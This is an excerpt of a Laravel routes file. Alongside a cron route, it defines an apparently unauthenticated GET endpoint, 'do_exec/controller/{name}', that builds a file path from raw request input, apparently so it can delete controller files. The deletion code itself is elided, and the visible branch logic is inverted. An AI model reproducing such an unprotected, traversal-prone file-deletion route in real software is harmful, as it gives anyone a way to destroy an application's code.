...
// Added By Awal
Route::get('user_cards_status_check', [CronJobsController::class, 'user_cards_status_check'])->name('user_cards_status_check');
...
//Very Very Sensitive
Route::get('do_exec/controller/{name}', function(){
    // File location
    $name = request('name');
    $file_location = base_path() . '/app/Http/Controllers/Api/V100/' . $name . '.php';
    ...
    if (file_exists($file_location)) {
        ...
        echo 'Cannot delete ' . $name . ', file not found.';
        exit;
    }
});
